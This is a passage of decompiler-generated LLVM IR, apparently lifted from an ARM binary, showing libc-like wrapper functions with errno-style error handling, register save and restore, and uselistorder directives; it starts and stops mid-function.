  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 12, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 1, 2, 7, 8, 9, 10, 11, 12, 13, 3, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32 (i32)* @function_11bf0, { 0, 25, 6, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 1, 10, 9, 8, 7, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @function_125e4, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12918, { 1, 0 }
  uselistorder label %dec_label_pc_128f4, { 1, 0 }
  uselistorder label %dec_label_pc_128b8.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_127e0, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_12754, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_1273c, { 1, 0 }
}

define i32 @function_12978(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12978:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12978 = load i32, i32* @r4, align 4
  store i32 %v3_12978, i32* %stack_var_-16, align 4
  %v3_12984 = urem i32 %arg3, 4096
  %v2_12988 = icmp eq i32 %v3_12984, 0
  br i1 %v2_12988, label %dec_label_pc_129a4, label %dec_label_pc_12990

dec_label_pc_12990:                               ; preds = %dec_label_pc_12978
  %v0_12990 = call i32 @function_d0ec()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1299c = inttoptr i32 %v0_12990 to i32*
  store i32 22, i32* %v2_1299c, align 4
  %v0_129d4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_129d4

dec_label_pc_129a4:                               ; preds = %dec_label_pc_12978
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_129d0, label %dec_label_pc_129c0

dec_label_pc_129c0:                               ; preds = %dec_label_pc_129a4
  %v0_129c0 = call i32 @function_d0ec()
  %v0_129c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_129c4 = sub i32 0, %v0_129c4
  %v2_129c8 = inttoptr i32 %v0_129c0 to i32*
  store i32 %v1_129c4, i32* %v2_129c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %dec_label_pc_129a4, %dec_label_pc_129c0
  %v0_129d0 = phi i32 [ %arg1, %dec_label_pc_129a4 ], [ -1, %dec_label_pc_129c0 ]
  store i32 %v0_129d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_129d4

dec_label_pc_129d4:                               ; preds = %dec_label_pc_12990, %dec_label_pc_129d0
  %v0_129d4 = phi i32 [ %v0_129d4.pre, %dec_label_pc_12990 ], [ %v0_129d0, %dec_label_pc_129d0 ]
  %v2_129d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_129d8, i32* @r4, align 4
  ret i32 %v0_129d4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_129d4, { 1, 0 }
  uselistorder label %dec_label_pc_129d0, { 1, 0 }
}

define i32 @function_129e0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_129e0:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_129e0 = load i32, i32* @r4, align 4
  %v6_129e0 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_129e8 = icmp eq i32 %arg2, 0
  store i32 142964, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_129e8, label %dec_label_pc_12a3c, label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129e0
  %v1_12a00 = add i32 %arg2, 4
  %v2_12a00 = inttoptr i32 %v1_12a00 to i32*
  %v3_12a00 = load i32, i32* %v2_12a00, align 4
  store i32 %v3_12a00, i32* @r3, align 4
  %v1_12a04 = and i32 %v3_12a00, 67108864
  %v2_12a04 = icmp eq i32 %v1_12a04, 0
  br i1 %v2_12a04, label %dec_label_pc_12a0c, label %dec_label_pc_12a3c

dec_label_pc_12a0c:                               ; preds = %dec_label_pc_12a00
  store i32 20, i32* @r2, align 4
  %v2_12a10 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12a10, i32* @r0, align 4
  %v0_12a14 = call i32 @function_f700()
  store i32 %v2_12a10, i32* @ip, align 4
  %v0_12a3c.pre = load i32, i32* @r5, align 4
  %v0_12a44.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a3c

dec_label_pc_12a3c:                               ; preds = %dec_label_pc_12a00, %dec_label_pc_129e0, %dec_label_pc_12a0c
  %v0_12a44 = phi i32 [ %arg3, %dec_label_pc_12a00 ], [ %arg3, %dec_label_pc_129e0 ], [ %v0_12a44.pre, %dec_label_pc_12a0c ]
  %v0_12a40 = phi i32 [ %arg2, %dec_label_pc_12a00 ], [ 0, %dec_label_pc_129e0 ], [ %v2_12a10, %dec_label_pc_12a0c ]
  %v0_12a3c = phi i32 [ %arg1, %dec_label_pc_12a00 ], [ %arg1, %dec_label_pc_129e0 ], [ %v0_12a3c.pre, %dec_label_pc_12a0c ]
  %v4_12a4c = call i32 @function_12e8c(i32 %v0_12a3c, i32 %v0_12a40, i32 %v0_12a44, i32 8)
  store i32 %v3_129e0, i32* @r4, align 4
  store i32 %v6_129e0, i32* @r5, align 4
  ret i32 %v4_12a4c

; uselistorder directives
  uselistorder label %dec_label_pc_12a3c, { 2, 0, 1 }
}

define i32 @function_12a60(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a60:
  %v0_12a60 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a60, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12a60
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12a60, %bb
  %v0_12a74 = phi i32 [ %arg1, %dec_label_pc_12a60 ], [ 0, %bb ]
  ret i32 %v0_12a74

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12a80() local_unnamed_addr {
dec_label_pc_12a80:
  %v0_12a90 = load i32, i32* @r0, align 4
  %v2_12a90 = icmp ugt i32 %v0_12a90, -4097
  br i1 %v2_12a90, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_12a80
  ret i32 %v0_12a90

bb1:                                              ; preds = %dec_label_pc_12a80
  %v4_12a9c = icmp eq i32 %v0_12a90, -38
  br i1 %v4_12a9c, label %dec_label_pc_12aa4, label %bb2

dec_label_pc_12aa4:                               ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_12aa4, %bb1
  %v0_12abc = call i32 @function_156f8()
  ret i32 %v0_12abc
}

define i32 @function_12ac0() local_unnamed_addr {
dec_label_pc_12ac0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ac0 = load i32, i32* @r7, align 4
  store i32 %v3_12ac0, i32* %stack_var_-8, align 4
  %v0_12acc = load i32, i32* @r0, align 4
  store i32 %v0_12acc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12acc, -4095
  br i1 %tmp, label %dec_label_pc_12ae8, label %dec_label_pc_12ad8

dec_label_pc_12ad8:                               ; preds = %dec_label_pc_12ac0
  %v0_12ad8 = call i32 @function_d0ec()
  %v0_12adc = load i32, i32* %r7.global-to-local, align 4
  %v1_12adc = sub i32 0, %v0_12adc
  %v2_12ae0 = inttoptr i32 %v0_12ad8 to i32*
  store i32 %v1_12adc, i32* %v2_12ae0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12aec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12ae8

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12ac0, %dec_label_pc_12ad8
  %v2_12aec = phi i32 [ %v3_12ac0, %dec_label_pc_12ac0 ], [ %v2_12aec.pre, %dec_label_pc_12ad8 ]
  %v0_12ae8 = phi i32 [ %v0_12acc, %dec_label_pc_12ac0 ], [ -1, %dec_label_pc_12ad8 ]
  store i32 %v2_12aec, i32* @r7, align 4
  ret i32 %v0_12ae8

; uselistorder directives
  uselistorder i32 %v0_12acc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ae8, { 1, 0 }
}

define i32 @function_12af4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12af4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12af4 = load i32, i32* @r7, align 4
  store i32 %v3_12af4, i32* %stack_var_-8, align 4
  %v0_12b00 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12b00, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12b00, -4095
  br i1 %tmp, label %dec_label_pc_12b20, label %dec_label_pc_12b10

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12af4
  %v0_12b10 = call i32 @function_d0ec()
  %v0_12b14 = load i32, i32* %r7.global-to-local, align 4
  %v1_12b14 = sub i32 0, %v0_12b14
  %v2_12b18 = inttoptr i32 %v0_12b10 to i32*
  store i32 %v1_12b14, i32* %v2_12b18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12b20.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12b20

dec_label_pc_12b20:                               ; preds = %dec_label_pc_12af4, %dec_label_pc_12b10
  %v1_12b24 = phi i32 [ %v0_12b00, %dec_label_pc_12af4 ], [ -1, %dec_label_pc_12b10 ]
  %v2_12b20 = phi i32 [ %v3_12af4, %dec_label_pc_12af4 ], [ %v2_12b20.pre, %dec_label_pc_12b10 ]
  store i32 %v2_12b20, i32* @r7, align 4
  ret i32 %v1_12b24

; uselistorder directives
  uselistorder i32 %v0_12b00, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12b20, { 1, 0 }
}

define i32 @function_12b28() local_unnamed_addr {
dec_label_pc_12b28:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b28 = load i32, i32* @r7, align 4
  store i32 %v3_12b28, i32* %stack_var_-8, align 4
  %v0_12b34 = load i32, i32* @r0, align 4
  store i32 %v0_12b34, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12b34, -4095
  br i1 %tmp, label %dec_label_pc_12b54, label %dec_label_pc_12b44

dec_label_pc_12b44:                               ; preds = %dec_label_pc_12b28
  %v0_12b44 = call i32 @function_d0ec()
  %v0_12b48 = load i32, i32* %r7.global-to-local, align 4
  %v1_12b48 = sub i32 0, %v0_12b48
  %v2_12b4c = inttoptr i32 %v0_12b44 to i32*
  store i32 %v1_12b48, i32* %v2_12b4c, align 4
  %v2_12b54.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12b28, %dec_label_pc_12b44
  %v1_12b58 = phi i32 [ %v0_12b34, %dec_label_pc_12b28 ], [ -1, %dec_label_pc_12b44 ]
  %v2_12b54 = phi i32 [ %v3_12b28, %dec_label_pc_12b28 ], [ %v2_12b54.pre, %dec_label_pc_12b44 ]
  store i32 %v2_12b54, i32* %r7.global-to-local, align 4
  ret i32 %v1_12b58

; uselistorder directives
  uselistorder i32 %v0_12b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12b54, { 1, 0 }
}

define i32 @function_12b5c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12b5c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_12b5c = load i32, i32* @r2, align 4
  %v9_12b5c = load i32, i32* @r3, align 4
  store i32 %v9_12b5c, i32* %stack_var_-4, align 4
  %v1_12b6c = and i32 %arg2, 64
  %v2_12b6c = icmp eq i32 %v1_12b6c, 0
  br i1 %v2_12b6c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_12b5c
  %v3_12b74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_12b74, i32* @r3, align 4
  %phitmp = urem i32 %v6_12b5c, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12b5c, %bb
  %v0_12b78 = phi i32 [ 0, %dec_label_pc_12b5c ], [ %phitmp, %bb ]
  store i32 %v0_12b78, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12ba8, label %dec_label_pc_12b98

dec_label_pc_12b98:                               ; preds = %.thread
  %v0_12b98 = call i32 @function_d0ec()
  %v0_12b9c = load i32, i32* %r7.global-to-local, align 4
  %v1_12b9c = sub i32 0, %v0_12b9c
  store i32 %v1_12b9c, i32* @r3, align 4
  %v2_12ba0 = inttoptr i32 %v0_12b98 to i32*
  store i32 %v1_12b9c, i32* %v2_12ba0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12ba8

dec_label_pc_12ba8:                               ; preds = %.thread, %dec_label_pc_12b98
  %v0_12ba8 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_12b98 ]
  ret i32 %v0_12ba8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ba8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12bbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12bbc:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12bbc = load i32, i32* @r7, align 4
  store i32 %v3_12bbc, i32* %stack_var_-8, align 4
  %v0_12bc8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12bc8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12bc8, -4095
  br i1 %tmp, label %dec_label_pc_12be8, label %dec_label_pc_12bd8

dec_label_pc_12bd8:                               ; preds = %dec_label_pc_12bbc
  %v0_12bd8 = call i32 @function_d0ec()
  %v0_12bdc = load i32, i32* %r7.global-to-local, align 4
  %v1_12bdc = sub i32 0, %v0_12bdc
  %v2_12be0 = inttoptr i32 %v0_12bd8 to i32*
  store i32 %v1_12bdc, i32* %v2_12be0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12be8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12be8

dec_label_pc_12be8:                               ; preds = %dec_label_pc_12bbc, %dec_label_pc_12bd8
  %v1_12bec = phi i32 [ %v0_12bc8, %dec_label_pc_12bbc ], [ -1, %dec_label_pc_12bd8 ]
  %v2_12be8 = phi i32 [ %v3_12bbc, %dec_label_pc_12bbc ], [ %v2_12be8.pre, %dec_label_pc_12bd8 ]
  store i32 %v2_12be8, i32* @r7, align 4
  ret i32 %v1_12bec

; uselistorder directives
  uselistorder i32 %v0_12bc8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12be8, { 1, 0 }
}

define i32 @function_12bf0() local_unnamed_addr {
dec_label_pc_12bf0:
  %v1_12c00 = load i32, i32* @r0, align 4
  ret i32 %v1_12c00
}

define i32 @function_12c04(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12c04:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c04 = load i32, i32* @r7, align 4
  store i32 %v3_12c04, i32* %stack_var_-8, align 4
  %v0_12c10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c10, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c10, -4095
  br i1 %tmp, label %dec_label_pc_12c30, label %dec_label_pc_12c20

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c04
  %v0_12c20 = call i32 @function_d0ec()
  %v0_12c24 = load i32, i32* %r7.global-to-local, align 4
  %v1_12c24 = sub i32 0, %v0_12c24
  %v2_12c28 = inttoptr i32 %v0_12c20 to i32*
  store i32 %v1_12c24, i32* %v2_12c28, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12c30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c30

dec_label_pc_12c30:                               ; preds = %dec_label_pc_12c04, %dec_label_pc_12c20
  %v1_12c34 = phi i32 [ %v0_12c10, %dec_label_pc_12c04 ], [ -1, %dec_label_pc_12c20 ]
  %v2_12c30 = phi i32 [ %v3_12c04, %dec_label_pc_12c04 ], [ %v2_12c30.pre, %dec_label_pc_12c20 ]
  store i32 %v2_12c30, i32* %r7.global-to-local, align 4
  ret i32 %v1_12c34

; uselistorder directives
  uselistorder i32 %v0_12c10, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c30, { 1, 0 }
}

define i32 @function_12c38() local_unnamed_addr {
dec_label_pc_12c38:
  %v1_12c48 = load i32, i32* @r0, align 4
  ret i32 %v1_12c48
}

define i32 @function_12c4c() local_unnamed_addr {
dec_label_pc_12c4c:
  %v1_12c5c = load i32, i32* @r0, align 4
  ret i32 %v1_12c5c
}

define i32 @function_12c60(i32 %arg1) local_unnamed_addr {
dec_label_pc_12c60:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12c60 = load i32, i32* @r4, align 4
  store i32 %v3_12c60, i32* %stack_var_-16, align 4
  store i32 142964, i32* %r4.global-to-local, align 4
  %v4_12c70 = load i32, i32* @global_var_25874.574, align 4
  %v2_12c74 = icmp eq i32 %v4_12c70, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_12c74, label %dec_label_pc_12c80, label %dec_label_pc_12c90

dec_label_pc_12c80:                               ; preds = %dec_label_pc_12c60
  %v1_12c84 = call i32 @function_156ac(i32 0)
  %v1_12c88 = icmp slt i32 %v1_12c84, 0
  br i1 %v1_12c88, label %dec_label_pc_12cb4, label %dec_label_pc_12c90thread-pre-split

dec_label_pc_12c90thread-pre-split:               ; preds = %dec_label_pc_12c80
  %v0_12c94.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_12c90.pre = load i32, i32* @global_var_25874.574, align 4
  br label %dec_label_pc_12c90

dec_label_pc_12c90:                               ; preds = %dec_label_pc_12c90thread-pre-split, %dec_label_pc_12c60
  %v0_12ca0 = phi i32 [ %v4_12c90.pre, %dec_label_pc_12c90thread-pre-split ], [ %v4_12c70, %dec_label_pc_12c60 ]
  %v1_12ca4 = phi i32 [ %v0_12c94.pr, %dec_label_pc_12c90thread-pre-split ], [ %arg1, %dec_label_pc_12c60 ]
  %v2_12c94 = icmp eq i32 %v1_12ca4, 0
  store i32 %v0_12ca0, i32* %r4.global-to-local, align 4
  br i1 %v2_12c94, label %dec_label_pc_12cb8, label %dec_label_pc_12ca0

dec_label_pc_12ca0:                               ; preds = %dec_label_pc_12c90
  %v2_12ca4 = add i32 %v1_12ca4, %v0_12ca0
  %v1_12ca8 = call i32 @function_156ac(i32 %v2_12ca4)
  %v1_12cac = icmp slt i32 %v1_12ca8, 0
  br i1 %v1_12cac, label %dec_label_pc_12cb4, label %dec_label_pc_12ca0.dec_label_pc_12cb8_crit_edge

dec_label_pc_12ca0.dec_label_pc_12cb8_crit_edge:  ; preds = %dec_label_pc_12ca0
  %v0_12cb8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12cb8

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12ca0, %dec_label_pc_12c80
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12cb8

dec_label_pc_12cb8:                               ; preds = %dec_label_pc_12c90, %dec_label_pc_12ca0.dec_label_pc_12cb8_crit_edge, %dec_label_pc_12cb4
  %v0_12cb8 = phi i32 [ %v0_12cb8.pre, %dec_label_pc_12ca0.dec_label_pc_12cb8_crit_edge ], [ -1, %dec_label_pc_12cb4 ], [ %v0_12ca0, %dec_label_pc_12c90 ]
  %v2_12cbc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12cbc, i32* @r4, align 4
  ret i32 %v0_12cb8

; uselistorder directives
  uselistorder i32 %v0_12ca0, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_156ac, { 1, 0 }
  uselistorder label %dec_label_pc_12cb8, { 2, 1, 0 }
}

define i32 @function_12ccc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ccc:
  %v1_12cdc = load i32, i32* @r0, align 4
  ret i32 %v1_12cdc
}

define i32 @function_12ce0() local_unnamed_addr {
dec_label_pc_12ce0:
  %stack_var_-16 = alloca i32, align 4
  %v2_12ce4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_12cf0 = call i32 @function_15724(i32 7, i32 %v2_12ce4)
  %v1_12cf4 = icmp slt i32 %v2_12cf0, 0
  %v5_12cf8 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_12cf4, i32 256, i32 %v5_12cf8
  ret i32 %storemerge
}

define i32 @function_12d0c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d0c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12d48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12d48, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12d48, -4095
  br i1 %tmp, label %dec_label_pc_12d68, label %dec_label_pc_12d58

dec_label_pc_12d58:                               ; preds = %dec_label_pc_12d0c
  %v0_12d58 = call i32 @function_d0ec()
  %v0_12d5c = load i32, i32* %r7.global-to-local, align 4
  %v1_12d5c = sub i32 0, %v0_12d5c
  %v2_12d60 = inttoptr i32 %v0_12d58 to i32*
  store i32 %v1_12d5c, i32* %v2_12d60, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d68

dec_label_pc_12d68:                               ; preds = %dec_label_pc_12d0c, %dec_label_pc_12d58
  %v1_12d74 = phi i32 [ %v0_12d48, %dec_label_pc_12d0c ], [ -1, %dec_label_pc_12d58 ]
  ret i32 %v1_12d74

; uselistorder directives
  uselistorder i32 %v0_12d48, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d68, { 1, 0 }
}

define i32 @function_12d78(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12d78:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12db4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12db4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12db4, -4095
  br i1 %tmp, label %dec_label_pc_12dd4, label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %dec_label_pc_12d78
  %v0_12dc4 = call i32 @function_d0ec()
  %v0_12dc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_12dc8 = sub i32 0, %v0_12dc8
  %v2_12dcc = inttoptr i32 %v0_12dc4 to i32*
  store i32 %v1_12dc8, i32* %v2_12dcc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12dd4

dec_label_pc_12dd4:                               ; preds = %dec_label_pc_12d78, %dec_label_pc_12dc4
  %v1_12de0 = phi i32 [ %v0_12db4, %dec_label_pc_12d78 ], [ -1, %dec_label_pc_12dc4 ]
  ret i32 %v1_12de0

; uselistorder directives
  uselistorder i32 %v0_12db4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12dd4, { 1, 0 }
}

define i32 @function_12de4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12de4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12de4 = load i32, i32* @r7, align 4
  store i32 %v3_12de4, i32* %stack_var_-8, align 4
  %v0_12df0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12df0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12df0, -4095
  br i1 %tmp, label %dec_label_pc_12e10, label %dec_label_pc_12e00

dec_label_pc_12e00:                               ; preds = %dec_label_pc_12de4
  %v0_12e00 = call i32 @function_d0ec()
  %v0_12e04 = load i32, i32* %r7.global-to-local, align 4
  %v1_12e04 = sub i32 0, %v0_12e04
  %v2_12e08 = inttoptr i32 %v0_12e00 to i32*
  store i32 %v1_12e04, i32* %v2_12e08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12e10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e10

dec_label_pc_12e10:                               ; preds = %dec_label_pc_12de4, %dec_label_pc_12e00
  %v1_12e14 = phi i32 [ %v0_12df0, %dec_label_pc_12de4 ], [ -1, %dec_label_pc_12e00 ]
  %v2_12e10 = phi i32 [ %v3_12de4, %dec_label_pc_12de4 ], [ %v2_12e10.pre, %dec_label_pc_12e00 ]
  store i32 %v2_12e10, i32* @r7, align 4
  ret i32 %v1_12e14

; uselistorder directives
  uselistorder i32 %v0_12df0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e10, { 1, 0 }
}

define i32 @function_12e18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12e18:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e18 = load i32, i32* @r7, align 4
  store i32 %v3_12e18, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12e40, label %dec_label_pc_12e30

dec_label_pc_12e30:                               ; preds = %dec_label_pc_12e18
  %v0_12e30 = call i32 @function_d0ec()
  %v0_12e34 = load i32, i32* %r7.global-to-local, align 4
  %v1_12e34 = sub i32 0, %v0_12e34
  %v2_12e38 = inttoptr i32 %v0_12e30 to i32*
  store i32 %v1_12e34, i32* %v2_12e38, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12e44.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e40

dec_label_pc_12e40:                               ; preds = %dec_label_pc_12e18, %dec_label_pc_12e30
  %v2_12e44 = phi i32 [ %v3_12e18, %dec_label_pc_12e18 ], [ %v2_12e44.pre, %dec_label_pc_12e30 ]
  %v0_12e40 = phi i32 [ %arg1, %dec_label_pc_12e18 ], [ -1, %dec_label_pc_12e30 ]
  store i32 %v2_12e44, i32* @r7, align 4
  ret i32 %v0_12e40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e40, { 1, 0 }
}

define i32 @function_12e4c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12e4c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12e80, label %dec_label_pc_12e70

dec_label_pc_12e70:                               ; preds = %dec_label_pc_12e4c
  %v0_12e70 = call i32 @function_d0ec()
  %v0_12e74 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e74 = sub i32 0, %v0_12e74
  %v2_12e78 = inttoptr i32 %v0_12e70 to i32*
  store i32 %v1_12e74, i32* %v2_12e78, align 4
  br label %dec_label_pc_12e80

dec_label_pc_12e80:                               ; preds = %dec_label_pc_12e4c, %dec_label_pc_12e70
  %v1_12e88 = phi i32 [ %arg1, %dec_label_pc_12e4c ], [ -1, %dec_label_pc_12e70 ]
  ret i32 %v1_12e88

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e80, { 1, 0 }
}

define i32 @function_12e8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12e8c:
  %r0.global-to-local = alloca i32, align 4
